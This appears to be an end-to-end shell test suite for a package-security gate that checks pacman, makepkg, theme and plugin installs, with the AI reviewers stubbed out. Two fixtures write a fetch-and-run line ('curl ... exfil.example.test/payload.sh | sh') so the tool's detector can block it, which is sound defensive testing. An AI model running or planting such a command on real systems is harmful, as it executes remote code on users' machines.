#!/bin/bash
# End-to-end tests for what the gates decide without a review: every case
# here ends before the AI would be asked, or with no reviewer to ask.
#
# The real Guardian binary and the real integration scripts are exercised.
# Nothing is installed, nothing is built and no reviewer is called:
#   * HOME and the XDG directories are throwaway directories
#   * `opencode` and `claude` on PATH are stand-ins that only record that
#     they were started; the suite fails if either ever is
#   * pacman is a stand-in parent process named "pacman", as in
#     integration-gates.sh; the transactions never reach a real pacman
#   * the scripts that name fixed system paths (the PATH wrappers, the Bash
#     interceptor and its installer) run as copies with those paths pointed
#     at recording stand-ins; the copy differs in nothing else
#
# What needs a completed review (a clean package allowed, a malicious one
# blocked, upstream code judged, upgrades, the cache) is in
# integration-gates.sh, which calls the AI. The makepkg gate's own jail is
# run here with the AI review off for AUR builds: the listing, the fetch and
# the questions it asks need no reviewer.
#
# Requirements: bsdtar, pacman (for pacman-conf), setsid. Optional: bwrap
# with user namespaces, for the hook's "not turned on" branch when the suite
# does not run as root; bwrap with overlays and makepkg, as a user, for the
# makepkg gate's jail; and an installed omarchy-guardian package plus jq,
# for the interceptor's presence check. A case whose requirement is missing
# is reported as skipped. A check that is known to fail today is run and
# shown as KNOWN with the reason, and counted apart from the failures.
#
# Run as root (a CI container), a reviewer from PATH is refused for the
# stand-in pacman, which is the first check; the other pacman cases then run
# with the reviewer the gate would really use, and are skipped when one is
# installed, so that none is ever asked.
#
# Usage:
#   cargo build --release
#   bash tests/e2e/gates-offline.sh
#
# Set GUARDIAN_E2E_ROOT to choose where the scratch directory is created and
# GUARDIAN_E2E_KEEP=1 to keep it for inspection.
set -uo pipefail

PROJECT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../.." && pwd -P)
BINARY=${GUARDIAN:-$PROJECT/target/release/omarchy-guardian}
E2E=$(mktemp -d -p "${GUARDIAN_E2E_ROOT:-${TMPDIR:-/tmp}}" guardian-offline-XXXXXX) || {
    printf 'cannot create a scratch directory; set GUARDIAN_E2E_ROOT\n' >&2
    exit 2
}
FAILURES=0
SKIPPED=0
KNOWN=0

if [[ ! -x $BINARY ]]; then
    printf 'Build Guardian first: cargo build --release\n' >&2
    exit 2
fi
for tool in bsdtar pacman-conf setsid; do
    command -v "$tool" >/dev/null || {
        printf 'missing required tool: %s\n' "$tool" >&2
        exit 77
    }
done

cleanup() {
    [[ -n ${GUARDIAN_E2E_KEEP:-} ]] || rm -rf -- "$E2E"
}
trap cleanup EXIT

export HOME="$E2E/home"
export XDG_CONFIG_HOME="$HOME/.config" XDG_CACHE_HOME="$HOME/.cache"
export XDG_STATE_HOME="$HOME/.local/state" XDG_DATA_HOME="$HOME/.local/share"
export OMARCHY_GUARDIAN_NO_NOTIFY=1
unset SUDO_USER DOAS_USER
AI_CALLED=$E2E/ai-called
OUT=$E2E/output
USER_CONFIG=$XDG_CONFIG_HOME/omarchy-guardian/config.toml
mkdir -p "$HOME" "$XDG_CONFIG_HOME/omarchy-guardian" "$E2E/stub"

# The reviewers found on PATH. Under a temporary directory Guardian refuses
# them unrun; anywhere else they answer nothing. Either way no review comes
# back, and the suite checks at the end that neither was started.
for tool in opencode claude; do
    printf '#!/bin/sh\nprintf "%%s\\n" "$0 $*" >>%q\nexit 1\n' "$AI_CALLED" >"$E2E/stub/$tool"
    chmod 755 "$E2E/stub/$tool"
done
export PATH="$E2E/stub:/usr/bin:/bin"

IS_ROOT=0
[[ $(id -u) == 0 ]] && IS_ROOT=1

expect() {
    local label=$1 want=$2 got=$3
    if [[ $want == "$got" ]]; then
        printf 'ok   %s (exit %s)\n' "$label" "$got"
    else
        printf 'FAIL %s: expected exit %s, got %s: %s\n' "$label" "$want" "$got" \
            "$(tail -n 5 "$OUT" 2>/dev/null | tr '\n' ';')"
        FAILURES=$((FAILURES + 1))
    fi
}

# expect_output <label> <fixed text>: an exit code alone is shared by many
# failures; this pins the reason.
expect_output() {
    local label=$1 text=$2
    if grep -qF -- "$text" "$OUT"; then
        printf 'ok   %s\n' "$label"
    else
        printf 'FAIL %s: output did not contain %s: %s\n' "$label" "$text" \
            "$(tail -n 5 "$OUT" | tr '\n' ';')"
        FAILURES=$((FAILURES + 1))
    fi
}

# check <label> <command...>: passes when the command succeeds.
check() {
    local label=$1
    shift
    if "$@"; then
        printf 'ok   %s\n' "$label"
    else
        printf 'FAIL %s\n' "$label"
        FAILURES=$((FAILURES + 1))
    fi
}

skip() {
    printf 'skip %s\n' "$1"
    SKIPPED=$((SKIPPED + 1))
}

# known <label> <why> <command...>: a check that is known to fail today. It
# is run and shown, and counted apart, so the suite stays usable while the
# cause is open; once the command succeeds the mark should go.
known() {
    local label=$1 why=$2
    shift 2
    if "$@"; then
        printf 'ok   %s (marked as a known failure: remove the mark)\n' "$label"
    else
        printf 'KNOWN %s: %s\n' "$label" "$why"
        KNOWN=$((KNOWN + 1))
    fi
}

absent() { [[ ! -e $1 && ! -L $1 ]]; }

# guardian [args...]: the binary with no terminal to ask on and nothing on
# standard input, output and errors kept for the checks.
guardian() {
    setsid -w "$BINARY" "$@" </dev/null >"$OUT" 2>&1
}

write_user_config() {
    if [[ -n ${1-} ]]; then printf '%s' "$1" >"$USER_CONFIG"; else rm -f -- "$USER_CONFIG"; fi
}

###############################################################################
# The pacman hook script: installed is not turned on
###############################################################################
hook_script() {
    printf '=== pacman hook script ===\n'
    local hook=$PROJECT/integrations/pacman/guardian-pacman-hook
    local enabled=/etc/pacman.d/hooks/omarchy-guardian.hook
    local packaged=/usr/share/omarchy-guardian/omarchy-guardian.hook
    local -a as_root=()
    local -a turned_on=()
    if ((IS_ROOT)); then
        if ! absent "$enabled"; then
            skip 'hook script as root: the hook is turned on on this system'
            return
        fi
        printf 'some-package\n' | /bin/sh "$hook" >"$OUT" 2>&1
        expect 'a hook that is installed and not turned on lets the transaction through' 0 "$?"
        check 'and says nothing' test ! -s "$OUT"
        # Only in a throwaway CI container is the switch made for real.
        if [[ ${CI:-} == true ]]; then
            mkdir -p /etc/pacman.d/hooks && ln -s "$packaged" "$enabled"
            printf 'some-package\n' | /bin/sh "$hook" >"$OUT" 2>&1
            local status=$?
            rm -f -- "$enabled"
            expect 'with the link the hook reviews, and refuses what it cannot review' 2 "$status"
        else
            skip 'hook script turned on as root: only in CI, where /etc is throwaway'
        fi
        return
    fi
    # Not root: the same script as root sees it, in a user namespace where
    # this user is root and /etc/pacman.d is empty.
    as_root=(bwrap --unshare-user --uid 0 --gid 0 --ro-bind / / --tmpfs /etc/pacman.d)
    if ! command -v bwrap >/dev/null || ! "${as_root[@]}" /usr/bin/true 2>/dev/null; then
        skip 'hook script as root: needs root, or bwrap with user namespaces'
        return
    fi
    printf 'some-package\n' | "${as_root[@]}" /bin/sh "$hook" >"$OUT" 2>&1
    expect 'a hook that is installed and not turned on lets the transaction through' 0 "$?"
    check 'and says nothing' test ! -s "$OUT"
    turned_on=("${as_root[@]}" --dir /etc/pacman.d/hooks --symlink "$packaged" "$enabled")
    printf 'some-package\n' | "${turned_on[@]}" /bin/sh "$hook" >"$OUT" 2>&1
    expect 'with the link the hook reviews, and refuses what it cannot review' 2 "$?"
}

###############################################################################
# The pacman gate, up to where a review would start
###############################################################################
# make_package <name> <path-in-package> <archive>: one file and no install
# script.
make_package() {
    local name=$1 file=$2 output=$3
    local root="$E2E/stage/$name"
    rm -rf -- "$root"
    mkdir -p "$root/$(dirname -- "$file")"
    {
        printf 'pkgname = %s\npkgbase = %s\npkgver = 1-1\n' "$name" "$name"
        printf 'pkgdesc = guardian e2e fixture\nurl = https://example.test\n'
        printf 'builddate = 0\npackager = Tester\nsize = 0\narch = x86_64\nlicense = MIT\n'
    } >"$root/.PKGINFO"
    printf '#!/bin/sh\nprintf "fixture\\n"\n' >"$root/$file"
    chmod 755 "$root/$file"
    bsdtar --zstd -C "$root" --format pax --uid 0 --gid 0 -cf "$output" .PKGINFO "${file%%/*}" || {
        printf 'could not build test archive\n' >&2
        exit 2
    }
}

pacman_gate() {
    printf '=== pacman gate without a review ===\n'
    local packages=$E2E/packages fakes=$E2E/fake
    local -a flags=(--opencode-from-path)
    mkdir -p "$packages" "$fakes"
    # The gate reads the transaction from its parent's name, argv and
    # working directory, so the stand-in stays the parent.
    local name
    for name in pacman yay; do
        printf '#!/bin/sh\nprintf "%%s\\n" "$TARGET" | "$GUARDIAN_BINARY" pacman-hook --pacman-pid $$ --cwd "$PWD" $HOOK_FLAGS\n' \
            >"$fakes/$name"
        chmod 755 "$fakes/$name"
    done
    # gate <stand-in> <target> [pacman args...]
    gate() {
        local parent=$1 target=$2
        shift 2
        (cd "$packages" && TARGET=$target GUARDIAN_BINARY=$BINARY HOOK_FLAGS=${flags[*]} \
            setsid -w "$fakes/$parent" "$@" </dev/null >"$OUT" 2>&1)
    }

    if ((IS_ROOT)); then
        gate pacman some-package -U /x-1-1-any.pkg.tar.zst
        expect "a reviewer from PATH is refused for root's pacman" 2 "$?"
        expect_output 'the refusal names the option' '--opencode-from-path is for tests'
        local reviewer
        for reviewer in /usr/bin/opencode /usr/local/bin/opencode /usr/bin/claude /usr/local/bin/claude; do
            if [[ -e $reviewer ]]; then
                skip "pacman gate cases as root: $reviewer could be asked for a review"
                return
            fi
        done
        flags=()
    fi

    gate pacman some-package -Rns some-package
    expect 'remove transactions are refused' 2 "$?"
    expect_output 'the refusal says which transactions are reviewed' 'only pacman sync (-S) and upgrade (-U)'
    gate yay some-package -U /x-1-1-any.pkg.tar.zst
    expect 'a hook not run by pacman is refused' 2 "$?"
    expect_output 'the refusal names the parent' 'not pacman'

    make_package guardian-plain usr/bin/guardian-plain "$packages/guardian-plain-1-1-x86_64.pkg.tar.zst"
    gate pacman guardian-plain -U "$packages/guardian-plain-1-1-x86_64.pkg.tar.zst"
    expect 'a package with no install script or auto-run file is limited' 0 "$?"
    expect_output 'the report says the review was limited' 'LIMITED REVIEW'
    gate pacman guardian-plain -U guardian-plain-1-1-x86_64.pkg.tar.zst
    expect "an archive named relative to pacman's directory is found" 0 "$?"
    check 'the pacman gate keeps no review memory' absent "$XDG_STATE_HOME/omarchy-guardian"

    gate pacman does-not-exist -U "$packages/does-not-exist.pkg.tar.zst"
    expect 'a missing archive is refused' 2 "$?"
    gate pacman guardian-mismatch -U "$packages/guardian-plain-1-1-x86_64.pkg.tar.zst"
    expect 'an archive that does not match the target is refused' 2 "$?"

    # Refused from the file list alone: /usr/sbin is a link to /usr/bin, and
    # the reviewer's system-wide settings are not a local package's to ship.
    make_package guardian-sbin usr/sbin/guardian-sbin "$packages/guardian-sbin-1-1-x86_64.pkg.tar.zst"
    gate pacman guardian-sbin -U "$packages/guardian-sbin-1-1-x86_64.pkg.tar.zst"
    expect 'a package that ships into /usr/sbin is not let through' 2 "$?"
    expect_output 'the report says why' 'is a link to a directory in /usr'
    make_package guardian-settings etc/claude-code/managed-settings.json \
        "$packages/guardian-settings-1-1-x86_64.pkg.tar.zst"
    gate pacman guardian-settings -U "$packages/guardian-settings-1-1-x86_64.pkg.tar.zst"
    expect "a local package that ships the reviewer's settings is not let through" 2 "$?"
    expect_output 'the report names the path' 'etc/claude-code'

    own_package
}

# Guardian's own package through its own gate: `./install.sh` upgrades with
# `pacman -U` while the hook is on, so what the local side says of the
# package decides whether Guardian can be upgraded at all (a local finding,
# or a file not followed, stops a local package whatever the AI says). The
# package is put together by the PKGBUILD's own package(), without makepkg.
own_package() {
    local root=$E2E/own/root src=$E2E/own/src archive=$packages/omarchy-guardian-1-1-x86_64.pkg.tar.zst
    mkdir -p "$root" "$src/target/release"
    cp -- "$BINARY" "$src/target/release/omarchy-guardian"
    if ! (
        # What makepkg sets for package().
        # shellcheck disable=SC2034
        startdir=$PROJECT/packaging/arch srcdir=$src pkgdir=$root
        # shellcheck disable=SC1091
        source "$PROJECT/packaging/arch/PKGBUILD" && package
    ) >"$OUT" 2>&1; then
        printf 'FAIL the PKGBUILD could not put the package together: %s\n' "$(tail -n 3 "$OUT" | tr '\n' ';')"
        FAILURES=$((FAILURES + 1))
        return
    fi
    {
        printf 'pkgname = omarchy-guardian\npkgbase = omarchy-guardian\npkgver = 1-1\n'
        printf 'pkgdesc = guardian e2e fixture\nurl = https://example.test\n'
        printf 'builddate = 0\npackager = Tester\nsize = 0\narch = x86_64\nlicense = MIT\n'
    } >"$root/.PKGINFO"
    cp -- "$PROJECT/packaging/arch/omarchy-guardian.install" "$root/.INSTALL"
    bsdtar --zstd -C "$root" --format pax --uid 0 --gid 0 -cf "$archive" .PKGINFO .INSTALL usr || {
        printf 'could not build test archive\n' >&2
        exit 2
    }
    gate pacman omarchy-guardian -U "$archive"
    # No reviewer here, so the transaction cannot pass; it must fail for
    # that reason alone.
    expect "Guardian's own package reaches the review" 2 "$?"
    whole() { ! grep -qF 'does not ship' "$OUT"; }
    check 'it is taken for a whole Guardian package' whole
    local_checks_pass() { grep -qE 'Local checks +no matches' "$OUT"; }
    check "the local rules find nothing in Guardian's own package" local_checks_pass
    all_followed() { ! grep -qF 'were not followed' "$OUT"; }
    check "every file of Guardian's own package is followed" all_followed
}

###############################################################################
# guard, scan and the makepkg gate
###############################################################################
user_gates() {
    printf '=== guard, scan and the makepkg gate without a review ===\n'
    local clean=$E2E/clean bad=$E2E/bad empty=$E2E/empty build=$E2E/build ran=$E2E/ran
    mkdir -p "$clean" "$bad" "$empty" "$build"
    printf 'local wallpaper = "/usr/share/backgrounds/omarchy/default.png"\n' >"$clean/hyprland.lua"
    printf '#!/bin/sh\ncurl -sS https://exfil.example.test/payload.sh | sh\n' >"$bad/run.sh"
    printf 'pkgname=guardian-e2e\npkgver=1\npkgrel=1\narch=(any)\nsource=()\npackage() { :; }\n' >"$build/PKGBUILD"
    # The makepkg the gate would start: it only leaves a mark.
    printf '#!/bin/sh\nprintf "%%s\\n" "$*" >%q\n' "$E2E/built" >"$E2E/makepkg"
    chmod 755 "$E2E/makepkg"
    makepkg_gate() {
        (cd "$1" && shift && setsid -w "$BINARY" makepkg-gate -- "$E2E/makepkg" "$@" </dev/null >"$OUT" 2>&1)
    }

    # No reviewer answers: under the default level that is no review, and
    # the report of the block is saved although no pop-up is shown.
    write_user_config
    guardian guard --class theme "$clean" -- /usr/bin/touch "$ran"
    expect 'guard blocks when no reviewer can be asked' 2 "$?"
    expect_output 'the block names the unavailable review' 'AI REVIEW UNAVAILABLE'
    check 'the command was not started' absent "$ran"
    has_report() { compgen -G "$XDG_CACHE_HOME/omarchy-guardian/reports/*.html" >/dev/null; }
    if ((IS_ROOT)); then
        # Root keeps no reports: the directory would be root's in a home.
        no_report() { ! has_report; }
        check 'no report is saved for root' no_report
    else
        check 'the report was saved with pop-ups off' has_report
    fi

    guardian guard --class theme "$empty" -- /usr/bin/touch "$ran"
    expect 'guard on nothing to review does not exit 0' 2 "$?"
    check 'the command was not started' absent "$ran"

    guardian scan --class system "$clean"
    check 'scan --class system is rejected' grep -qF 'takes one of: aur, theme, plugin, source' "$OUT"
    guardian guard --class system "$clean" -- /usr/bin/touch "$ran"
    check 'guard --class system is rejected' grep -qF 'takes one of: aur, theme, plugin, source' "$OUT"
    check 'the command was not started' absent "$ran"

    # The level without AI asks on the terminal; with none the answer is no.
    write_user_config $'profile = "local-only"\n'
    guardian guard --class theme "$clean" -- /usr/bin/touch "$ran"
    expect 'guard without a terminal to confirm on is not confirmed' 2 "$?"
    expect_output 'the report says it was not confirmed' 'NOT CONFIRMED'
    check 'the command was not started' absent "$ran"
    guardian guard --class theme "$bad" -- /usr/bin/touch "$ran"
    expect 'a local finding blocks before any question' 1 "$?"
    check 'the command was not started' absent "$ran"
    makepkg_gate "$build" --noconfirm
    expect 'the makepkg gate without a terminal to confirm on is not confirmed' 2 "$?"
    expect_output 'the report says it was not confirmed' 'NOT CONFIRMED'
    makepkg_gate "$empty" --noconfirm
    expect 'the makepkg gate without a PKGBUILD is refused' 2 "$?"
    makepkg_gate "$build" -p other.PKGBUILD
    expect 'the makepkg gate refuses another recipe than the one it reviews' 2 "$?"
    printf 'BUILDDIR=/var/tmp/elsewhere\n' >>"$build/PKGBUILD"
    makepkg_gate "$build" --noconfirm
    expect "a recipe that moves makepkg's directories is blocked" 1 "$?"
    expect_output 'the block names the line' 'BUILDDIR=/var/tmp/elsewhere'
    check 'makepkg was never started' absent "$E2E/built"

    # A user file that does not parse stops every gate that reviews with it;
    # the settings commands still run, so it can be found and fixed.
    write_user_config $'profile = "strict\n'
    guardian guard --class theme "$clean" -- /usr/bin/touch "$ran"
    expect 'guard stops on a broken user settings file' 2 "$?"
    expect_output 'and says nothing was reviewed or run' 'the user settings file is invalid'
    check 'the command was not started' absent "$ran"
    guardian scan "$clean"
    expect 'scan stops on a broken user settings file' 2 "$?"
    guardian sandbox "$clean" -- /usr/bin/true
    expect 'sandbox stops on a broken user settings file' 2 "$?"
    sed -i '$d' "$build/PKGBUILD"
    makepkg_gate "$build" --noconfirm
    expect 'the makepkg gate stops on a broken user settings file' 2 "$?"
    expect_output 'and says nothing was reviewed or run' 'the user settings file is invalid'
    check 'makepkg was never started' absent "$E2E/built"
    guardian config check
    expect 'config check reports the broken file' 2 "$?"
    expect_output 'and names it invalid' 'INVALID'
    write_user_config
}

###############################################################################
# The makepkg gate's own jail, with the AI review off for AUR builds
###############################################################################
# With `ai = "off"` and no confirmation for the class, the gate goes all the
# way with the local checks alone: it lists the sources in its jail, fetches
# and extracts them, reviews them and starts makepkg. The makepkg it starts
# only leaves a mark; the listing and the extraction go to the real one,
# which is kept beside it in /usr, the only place the gate's jail shows.
makepkg_jail() {
    printf '=== the makepkg gate, sources and all, without AI ===\n'
    local build=$E2E/jail-build built=$E2E/jail-built
    local -a sandbox=()
    mkdir -p "$E2E/usr-layer/bin" "$build"
    sandbox=(bwrap --dev-bind / / --overlay-src /usr --overlay-src "$E2E/usr-layer" --tmp-overlay /usr
        --ro-bind "$E2E/jail-makepkg" /usr/bin/makepkg)
    printf '#!/bin/sh\ncase " $* " in\n*" --printsrcinfo "* | *" --nobuild "*) exec /usr/bin/makepkg.real "$@" ;;\nesac\nprintf "%%s\\n" "$*" >%q\n' \
        "$built" >"$E2E/jail-makepkg"
    chmod 755 "$E2E/jail-makepkg"
    if ((IS_ROOT)) || [[ ! -x /usr/bin/makepkg ]] || ! command -v bwrap >/dev/null ||
        ! cp -- /usr/bin/makepkg "$E2E/usr-layer/bin/makepkg.real" ||
        ! "${sandbox[@]}" /usr/bin/true 2>/dev/null; then
        skip 'makepkg gate jail: needs makepkg and bwrap with overlays, as a user (makepkg refuses root)'
        return
    fi
    # jail_gate [makepkg args...]: the gate in the build directory.
    jail_gate() {
        rm -f -- "$built"
        (cd "$build" && setsid -w "${sandbox[@]}" "$BINARY" makepkg-gate -- /usr/bin/makepkg "$@" \
            </dev/null >"$OUT" 2>&1)
    }
    # recipe <source array> <functions>
    recipe() {
        rm -rf -- "$build"
        mkdir -p "$build"
        printf 'pkgname=guardian-e2e\npkgver=1\npkgrel=1\npkgdesc="test fixture"\narch=(any)\nlicense=(MIT)\n%s\n%s\n' \
            "$1" "$2" >"$build/PKGBUILD"
        printf '#!/bin/sh\nprintf "hello\\n"\n' >"$build/hello.sh"
    }
    local package='package() { install -Dm755 "$srcdir/hello.sh" "$pkgdir/usr/bin/guardian-e2e"; }'
    write_user_config $'[class.aur]\nai = "off"\nconfirm = false\n'

    recipe $'source=(hello.sh)\nsha256sums=(SKIP)' $'build() { :; }\n'"$package"
    jail_gate --noconfirm
    expect 'a clean build is started' 0 "$?"
    expect_output 'its sources were extracted and reviewed' 'Upstream: 1 of 1 code and build file(s) reviewed'
    # --holdver: the build uses exactly the sources fetched for the review.
    check 'makepkg got the original arguments and --holdver' \
        test "$(cat "$built" 2>/dev/null)" = '--noconfirm --holdver'

    # yay's later call for the same build: what changed since the gate
    # extracted the sources is found and reviewed first.
    printf '#!/bin/sh\nprintf "prepared\\n"\n' >"$build/src/prepared.sh"
    jail_gate --noconfirm --noextract
    expect 'a later call with a new file among the sources is started' 0 "$?"
    expect_output 'the new file was noticed' '1 file(s) are new or changed since Guardian extracted them'
    check 'makepkg got the original arguments' test "$(cat "$built" 2>/dev/null)" = '--noconfirm --noextract'
    # (What is in the sources is judged by the AI alone: with it off, as
    # here, the local rules read the recipe's own files and nothing
    # upstream. integration-gates.sh has the malicious upstream script.)
    printf '\ncurl -sS https://exfil.example.test/payload.sh | sh\n' >>"$build/hello.sh"
    jail_gate --noconfirm --noextract
    expect "a later call whose recipe's own file turned malicious is blocked" 1 "$?"
    check 'makepkg was not started' absent "$built"

    # Two questions the gate asks on the terminal; with none, the answer is
    # no. A recipe that sets its sources under a condition, and a package
    # made of a prebuilt program.
    recipe $'if [ -n "$HOME" ]; then\n    source=(hello.sh)\nfi\nsha256sums=(SKIP)' "$package"
    jail_gate --noconfirm
    expect 'a recipe whose sources cannot be followed is not confirmed' 2 "$?"
    expect_output 'the gate says what it cannot follow' 'where Guardian cannot follow'
    expect_output 'and that it was not confirmed' 'NOT CONFIRMED'
    check 'makepkg was not started' absent "$built"
    recipe $'source=(hello.sh tool)\nsha256sums=(SKIP SKIP)' \
        'package() { install -Dm755 "$srcdir/tool" "$pkgdir/usr/bin/guardian-e2e"; }'
    cp -- /usr/bin/true "$build/tool"
    jail_gate --noconfirm
    expect 'a package of a prebuilt program is not confirmed' 2 "$?"
    expect_output 'the gate names the prebuilt program' 'prebuilt program(s) nobody reviewed'
    expect_output 'and that it was not confirmed' 'NOT CONFIRMED'
    check 'makepkg was not started' absent "$built"
    write_user_config
}

###############################################################################
# Theme and plugin commands: the PATH wrappers and the Bash interceptor
###############################################################################
ROUTE_LOG=$E2E/route.log

# with_stand_ins <script> <copy>: the script with Guardian's and Omarchy's
# fixed directories pointed at the recording stand-ins, and nothing else
# changed.
with_stand_ins() {
    sed -e "s|/usr/lib/omarchy-guardian|$E2E/lib|g" -e "s|/usr/share/omarchy/bin|$E2E/omarchy-bin|g" \
        -- "$1" >"$2"
    if grep -qE '/usr/lib/omarchy-guardian|/usr/share/omarchy/bin' "$2" || cmp -s -- "$1" "$2"; then
        printf 'FAIL %s could not be pointed at the stand-ins\n' "$1"
        FAILURES=$((FAILURES + 1))
    fi
}

# expect_route <label> <what must have run> <command...>
expect_route() {
    local label=$1 want=$2 got
    shift 2
    : >"$ROUTE_LOG"
    "$@" >/dev/null 2>&1 </dev/null
    got=$(<"$ROUTE_LOG")
    if [[ $got == "$want" ]]; then
        printf 'ok   %s\n' "$label"
    else
        printf 'FAIL %s: ran "%s", expected "%s"\n' "$label" "$got" "$want"
        FAILURES=$((FAILURES + 1))
    fi
}

# routing <how>: `how` runs a command line as the wrappers on PATH, or as
# the functions of the Bash interceptor, would.
routing() {
    local how=$1 url=https://example.test/theme.git
    expect_route "$how: omarchy theme install goes to Guardian" "guardian-theme install $url" \
        "$how" omarchy theme install "$url"
    expect_route "$how: omarchy theme-install goes to Guardian" "guardian-theme install $url" \
        "$how" omarchy theme-install "$url"
    expect_route "$how: omarchy theme update goes to Guardian" 'guardian-theme update' \
        "$how" omarchy theme update
    expect_route "$how: omarchy plugin add goes to Guardian" "guardian-plugin add $url" \
        "$how" omarchy plugin add "$url"
    expect_route "$how: omarchy plugin install goes to Guardian" "guardian-plugin install $url" \
        "$how" omarchy plugin install "$url"
    expect_route "$how: omarchy plugin-update goes to Guardian" 'guardian-plugin update' \
        "$how" omarchy plugin-update
    expect_route "$how: omarchy-theme-install goes to Guardian" "guardian-theme install $url" \
        "$how" omarchy-theme-install "$url"
    expect_route "$how: omarchy-theme-update goes to Guardian" 'guardian-theme update' \
        "$how" omarchy-theme-update
    expect_route "$how: omarchy-plugin-add goes to Guardian" "guardian-plugin add $url" \
        "$how" omarchy-plugin-add "$url"
    expect_route "$how: omarchy-plugin-update goes to Guardian" 'guardian-plugin update' \
        "$how" omarchy-plugin-update
    # `-h` after `--` installs, so it is no request for help.
    expect_route "$how: an install with -h after -- still goes to Guardian" "guardian-theme install $url -- -h" \
        "$how" omarchy theme install "$url" -- -h
    expect_route "$how: help is Omarchy's own" 'omarchy theme install --help' \
        "$how" omarchy theme install --help
    expect_route "$how: help for the command by name is Omarchy's own" 'omarchy theme install --help' \
        "$how" omarchy-theme-install -h
    expect_route "$how: every other omarchy command goes straight through" 'omarchy update --yes' \
        "$how" omarchy update --yes
}

on_path() {
    PATH="$E2E/lib/bin:$E2E/omarchy-bin:/usr/bin:/bin" "$@"
}

in_bash() {
    PATH="$E2E/omarchy-bin:/usr/bin:/bin" /usr/bin/bash --norc --noprofile -c \
        'source "$1" && shift && "$@"' _ "$E2E/lib/omarchy-bash-interceptor.sh" "$@"
}

theme_commands() {
    printf '=== theme and plugin commands ===\n'
    local name
    mkdir -p "$E2E/lib/bin" "$E2E/omarchy-bin"
    for name in guardian-theme guardian-plugin; do
        printf '#!/bin/sh\nprintf "%%s\\n" "%s $*" >>%q\n' "$name" "$ROUTE_LOG" >"$E2E/lib/$name"
        chmod 755 "$E2E/lib/$name"
    done
    for name in omarchy omarchy-theme-install omarchy-theme-update omarchy-plugin-add omarchy-plugin-update; do
        printf '#!/bin/sh\nprintf "%%s\\n" "%s $*" >>%q\n' "$name" "$ROUTE_LOG" >"$E2E/omarchy-bin/$name"
        chmod 755 "$E2E/omarchy-bin/$name"
        with_stand_ins "$PROJECT/integrations/omarchy/bin/$name" "$E2E/lib/bin/$name"
        chmod 755 "$E2E/lib/bin/$name"
    done
    with_stand_ins "$PROJECT/integrations/omarchy/omarchy-bash-interceptor.sh" \
        "$E2E/lib/omarchy-bash-interceptor.sh"
    routing on_path
    routing in_bash

    # The installer adds the line that loads the interceptor once, and keeps
    # the file as it was before its first edit.
    with_stand_ins "$PROJECT/integrations/omarchy/install-user-interceptor.sh" "$E2E/install-interceptor.sh"
    local line="[[ -r $E2E/lib/omarchy-bash-interceptor.sh ]] && source $E2E/lib/omarchy-bash-interceptor.sh"
    printf '# mine\n' >"$HOME/.bashrc"
    /usr/bin/bash "$E2E/install-interceptor.sh" >"$OUT" 2>&1
    expect 'the interceptor installer runs' 0 "$?"
    /usr/bin/bash "$E2E/install-interceptor.sh" >"$OUT" 2>&1
    expect 'and runs again' 0 "$?"
    check 'the line that loads the interceptor is there once' \
        test "$(grep -cxF -- "$line" "$HOME/.bashrc")" = 1
    check 'the file as it was is kept beside it' \
        test "$(cat "$HOME/.bashrc.guardian-bak" 2>/dev/null)" = '# mine'
}

###############################################################################
# The bar's check that the Bash interceptor is really loaded
###############################################################################
interceptor_state() {
    printf '=== the interceptor presence check ===\n'
    local installed=/usr/lib/omarchy-guardian/install-user-interceptor.sh
    local source_line='[[ -r /usr/lib/omarchy-guardian/omarchy-bash-interceptor.sh ]] && source /usr/lib/omarchy-guardian/omarchy-bash-interceptor.sh'
    if [[ ! -e $installed ]] || ! command -v jq >/dev/null; then
        skip 'interceptor presence check: needs the installed omarchy-guardian package and jq'
        return
    fi
    # state: what `status` says of the theme & plugin gate for this ~/.bashrc.
    state() {
        printf '%s\n' "$1" >"$HOME/.bashrc"
        setsid -w "$BINARY" status </dev/null 2>/dev/null |
            jq -r '.gates[] | select(.label == "Theme & plugin gate") | .state'
    }
    # With Omarchy installed the menu half is off in this throwaway home,
    # so the line alone makes the gate partly on; without it, on.
    counts() { [[ $(state "$source_line") == @(on|partial) ]]; }
    check 'the line that loads the interceptor counts' counts
    check 'the marker without the line does not' \
        test "$(state '# Omarchy Guardian theme command interception')" = off
    check 'a line that is commented out does not' test "$(state "# $source_line")" = off
    # not_effective <~/.bashrc>: the gate is partly on, and the bar says the
    # line is there and does nothing.
    not_effective() {
        [[ $(state "$1") == partial ]] &&
            setsid -w "$BINARY" status </dev/null 2>/dev/null |
            jq -e '.gates[] | select(.label == "Theme & plugin gate") | .detail | test("not effective in Bash")' \
                >/dev/null
    }
    check 'a line after a return is said to be without effect' not_effective $'return\n'"$source_line"
    check 'and so is the line inside a function' not_effective $'f() {\n'"$source_line"$'\n}'
    check 'and a line that only names the file' \
        not_effective 'echo /usr/lib/omarchy-guardian/omarchy-bash-interceptor.sh'
}

hook_script
pacman_gate
user_gates
makepkg_jail
theme_commands
interceptor_state

printf '\n'
if [[ -e $AI_CALLED ]]; then
    printf 'FAIL a reviewer was started: %s\n' "$(tr '\n' ';' <"$AI_CALLED")"
    FAILURES=$((FAILURES + 1))
else
    printf 'ok   no reviewer was started\n'
fi
if [[ $FAILURES == 0 ]]; then
    printf 'ALL OFFLINE GATE TESTS PASSED (%d skipped, %d known failure(s))\n' "$SKIPPED" "$KNOWN"
    exit 0
fi
printf '%d OFFLINE GATE TEST(S) FAILED\n' "$FAILURES"
exit 1
